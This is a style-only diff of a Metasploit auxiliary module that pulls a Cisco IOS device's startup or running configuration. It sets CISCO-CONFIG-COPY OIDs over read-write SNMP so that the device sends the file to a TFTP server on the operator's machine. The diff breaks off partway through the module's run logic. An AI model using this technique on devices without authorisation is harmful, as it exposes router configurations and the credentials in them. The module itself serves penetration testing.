@@ -10,7 +10,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'        => 'Cisco IOS SNMP Configuration Grabber (TFTP)',
+      'Name' => 'Cisco IOS SNMP Configuration Grabber (TFTP)',
       'Description' => %q{
           This module will download the startup or running configuration
         from a Cisco IOS device using SNMP and TFTP. A read-write SNMP
@@ -19,19 +19,17 @@ class MetasploitModule < Msf::Auxiliary
         be able to connect back to the Metasploit system and the use of
         NAT will cause the TFTP transfer to fail.
       },
-      'Author'      =>
-        [
-          'pello <fropert[at]packetfault.org>', 'hdm'
-        ],
-      'License'     => MSF_LICENSE
+      'Author' => [
+        'pello <fropert[at]packetfault.org>', 'hdm'
+      ],
+      'License' => MSF_LICENSE
     )
     register_options([
-      OptEnum.new("SOURCE", [true, "Grab the startup (3) or running (4) configuration", "4", ["3","4"]]),
+      OptEnum.new("SOURCE", [true, "Grab the startup (3) or running (4) configuration", "4", ["3", "4"]]),
       OptString.new('OUTPUTDIR', [ false, "The directory where we should save the configuration files (disabled by default)"]),
       OptAddressLocal.new('LHOST', [ false, "The IP address of the system running this module" ])
     ])
   end
-
 
   #
   # Start the TFTP Server
@@ -40,7 +38,7 @@ class MetasploitModule < Msf::Auxiliary
     # Setup is called only once
     print_status("Starting TFTP server...")
     @tftp = Rex::Proto::TFTP::Server.new(69, '0.0.0.0', { 'Msf' => framework, 'MsfExploit' => self })
-    @tftp.incoming_file_hook = Proc.new{|info| process_incoming(info) }
+    @tftp.incoming_file_hook = Proc.new { |info| process_incoming(info) }
     @tftp.start
     add_socket(@tftp.sock)
 
@@ -72,6 +70,7 @@ class MetasploitModule < Msf::Auxiliary
   #
   def process_incoming(info)
     return if not info[:file]
+
     name = info[:file][:name]
     data = info[:file][:data]
     from = info[:from]
@@ -99,32 +98,30 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run_host(ip)
-
     begin
-      source   = datastore['SOURCE'].to_i
+      source = datastore['SOURCE'].to_i
       protocol = 1
       filename = "#{ip}.txt"
-      lhost    = datastore['LHOST'] || Rex::Socket.source_address(ip)
+      lhost = datastore['LHOST'] || Rex::Socket.source_address(ip)
 
       ccconfigcopyprotocol = "1.3.6.1.4.1.9.9.96.1.1.1.1.2."
       cccopysourcefiletype = "1.3.6.1.4.1.9.9.96.1.1.1.1.3."
-      cccopydestfiletype   = "1.3.6.1.4.1.9.9.96.1.1.1.1.4."
-      cccopyserveraddress  = "1.3.6.1.4.1.9.9.96.1.1.1.1.5."
-      cccopyfilename       = "1.3.6.1.4.1.9.9.96.1.1.1.1.6."
+      cccopydestfiletype = "1.3.6.1.4.1.9.9.96.1.1.1.1.4."
+      cccopyserveraddress = "1.3.6.1.4.1.9.9.96.1.1.1.1.5."
+      cccopyfilename = "1.3.6.1.4.1.9.9.96.1.1.1.1.6."
       cccopyentryrowstatus = "1.3.6.1.4.1.9.9.96.1.1.1.1.14."
 
       session = rand(255) + 1
 
       snmp = connect_snmp
 
-
-      varbind = SNMP::VarBind.new("#{ccconfigcopyprotocol}#{session}" , SNMP::Integer.new(protocol))
+      varbind = SNMP::VarBind.new("#{ccconfigcopyprotocol}#{session}", SNMP::Integer.new(protocol))
       value = snmp.set(varbind)
 
       # If the above line didn't throw an error, the host is alive and the community is valid
       print_status("Trying to acquire configuration from #{ip}...")
 
-      varbind = SNMP::VarBind.new("#{cccopysourcefiletype}#{session}" , SNMP::Integer.new(source))
+      varbind = SNMP::VarBind.new("#{cccopysourcefiletype}#{session}", SNMP::Integer.new(source))
       value = snmp.set(varbind)
 
       varbind = SNMP::VarBind.new("#{cccopydestfiletype}#{session}", SNMP::Integer.new(1))
